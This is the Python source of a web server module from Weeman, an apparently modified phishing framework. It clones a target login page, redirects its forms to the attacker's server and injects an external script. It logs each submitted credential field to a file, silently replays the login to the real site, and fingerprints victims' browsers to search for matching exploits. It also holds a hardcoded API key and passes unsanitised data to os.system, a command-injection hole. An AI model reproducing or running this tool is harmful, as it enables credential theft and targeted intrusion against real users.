#
# httpd.py - the main httpd server
#
# This file if part of weeman project
#
# See 'LICENSE' file for copying
#

import SimpleHTTPServer
import SocketServer
import urllib2
import cgi
import os
import time
from socket import error as socerr
from core.config import __version__
from core.config import __codename__
from core.misc import printt
from lib.bs4 import BeautifulSoup as bs
## Additional dependencies
import requests, urllib, os

class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ## Set server version
    server_version = "Weeman %s (%s)" %(__version__, __codename__)
    """
        Log message handler for simple HTTP server.
    """

    def do_POST(self):
	#Setup redirect
	os.system('cp redirect.html.orig redirect.html')
	
        post_request = []
        printt(3, "%s - sent POST request." %self.address_string())
        form = cgi.FieldStorage(self.rfile,
        headers=self.headers,
        environ={'REQUEST_METHOD':'POST',
                 'CONTENT_TYPE':self.headers['Content-Type'],})
        try:
            from core.shell import url
            
            logger = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "a")
            logger.write("\n## %s - Data for %s\n\n" %(time.strftime("%H:%M:%S - %d/%m/%y"), url))
            
	    ## Get the User-Agent header and query useragentapi for json information regarding the browser
    	    user_agent = urllib.quote_plus(self.headers['User-Agent'])
            ## UserAgentAPI Account registered for up to 1000 calls per day
	    ## If more are needed register a new APIKEY 
	    apikey = '8c21e71c'
	    r = requests.get('https://useragentapi.com/api/v3/json/'+apikey+'/'+user_agent)
            printt(2, "Operating System: "+r.json()[u'data'][u'platform_name']+" "+r.json()[u'data'][u'platform_version'])
	    printt(2, "Browser: "+r.json()[u'data'][u'browser_name']+" "+r.json()[u'data'][u'browser_version'])
	    printt(2, "Platform: "+r.json()[u'data'][u'platform_type'])
	    # printt(2, "Rendering Engine: "+r.json()[u'data'][u'engine_name']+" "+r.json()[u'data'][u'engine_version']) 
	    
	    printt(2, "Potential Metasploit Modules:")
		    
	    os.system('searchsploit '+r.json()[u'data'][u'platform_name']+' '+r.json()[u'data'][u'platform_version'])
	    os.system('searchsploit '+r.json()[u'data'][u'browser_name']+' '+r.json()[u'data'][u'browser_version'])

	    ## Check HTTP_ACCEPT for Flash
	    if ('flash' in self.headers['Accept']) or ('flash' in self.headers['Accept']):
	        printt(2, "Flash found: "+self.headers['Accept'])
	    else:
		printt(2, "Flash not found")

            for tag in form.list:
                tmp = str(tag).split("(")[1]
                key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
                post_request.append("%s %s" %(key,value))
                printt(2, "%s => %s" %(key,value))
                logger.write("%s => %s\n" %(key,value))
            logger.close()
            
            from core.shell import action_url
            
            create_post(url,action_url, post_request)
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        except socerr as e:
            printt(3, "%s igonring ..." %str(e))
        except Exception as e:
            printt(3, "%s igonring ..." %str(e))

    def log_message(self, format, *args):
        
        arg = format%args
        if arg.split()[1] == "/":
            printt(3, "%s - sent GET request without parameters." %self.address_string())
        else:
            if arg.split()[1].startswith("/") and "&" in arg.split()[1]:
                printt(3, "%s - sent GET request with parameters." %self.address_string())
                printt(2, "%s" %arg.split()[1])

class weeman(object):
    """
        weeman Object 
    """
    def __init__(self, url,port):        

        from core.shell import url
        from core.shell import port
        
        self.port = port
        self.httpd = None
        self.url = url
        self.form_url = None;

    def request(self,url):
        """
            Send request to the http server.
        """

        from core.shell import user_agent
        
        opener = urllib2.build_opener()
        opener.addheaders = [('User-Agent', user_agent),
                ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),
                #("Accept-Language","en-US,en;q=0.9,en;q=0.8"),
                #("Accept-Encoding", "gzip;q=0,deflate,sdch"),
                #("Accept-Charset", "ISO-8859-2,utf-8;q=0.7,*;q=0.7"),
                ("Keep-Alive", "115"),
                ("Connection", "keep-alive"),
                ("DNT", "1")]
        return opener.open(self.url).read()

    def clone(self):

        from core.shell import html_file
        from core.shell import external_js

        if not html_file:
            printt(3, "Trying to get %s  ..." %self.url)
            printt(3, "Downloadng webpage ...")
            data = self.request(self.url)
        else:
            printt(3, "Loading \'%s\' ..." %html_file)
            data = open(html_file, "r").read()

        data = bs(data, "html.parser")
        printt(3, "Modifying the HTML file ...")

        for tag in data.find_all("form"):
            tag['method'] = "post"
            tag['action'] = "redirect.html"


        # Replace path with full path with the URL
        for tag in data.find_all("a"):
            pass

        # Insert external script
        script = data.new_tag('script', src=external_js)
        data.html.head.insert(len(data.html.head), script)
        
        with open("index.html", "w") as index:
            index.write(data.prettify().encode('utf-8'))
            index.close()

    def serve(self):
        
        print("\033[01;35m[i] Starting Weeman %s server on http://localhost:%d\033[00m" %(__version__, self.port))
        self.httpd = SocketServer.TCPServer(("", self.port),handler)
        self.httpd.serve_forever()

    def cleanup(self):
        
        if os.path.exists("index.html"):
            printt(3, "\n[i] Running cleanup ...")
            os.remove("index.html")
        if os.path.exists("redirect.html"):
            os.remove("redirect.html")

def create_post(url,action_url, post_request):
    """
        Create the page that will reidrect to the orignal page.
    """
    
    printt(3, "Creating redirect.html ...")
    
    with open("redirect.html","w") as r:
        r.write("<body><form id=\"firefox\" action=\"%s\" method=\"post\" >\n" %action_url)
        for post in post_request:
            key,value = post.split()
            r.write("<input name=\"%s\" value=\"%s\" type=\"hidden\" >\n" %(key,value))
        r.write("<input name=\"login\" type=\"hidden\">")
        r.write("<script langauge=\"javascript\">document.forms[\"firefox\"].submit();</script>")
    r.close()
